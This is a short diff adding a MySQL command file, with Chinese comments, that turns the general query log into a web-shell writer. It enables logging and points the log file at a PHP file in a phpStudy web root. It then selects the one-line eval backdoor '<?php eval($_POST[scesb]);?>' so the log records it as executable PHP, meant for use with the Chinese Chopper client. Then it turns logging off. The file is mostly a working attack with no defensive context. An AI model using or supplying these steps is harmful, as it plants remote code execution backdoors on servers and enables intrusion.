@@ -1,0 +1,10 @@
+
+##查看日志路径和是否开启日志
+show variables like 'general%';
+## 设置日志是否开启和路径（一定要是网站的绝对路径下）
+set global general_log "on";
+set global general_log_file = 'C:/phpStudy/PHPTutorial/WWW/sce.php';
+##写入一句话，使用菜刀工具
+select '<?php eval($_POST[scesb]);?>';
+set global general_log "off";
+
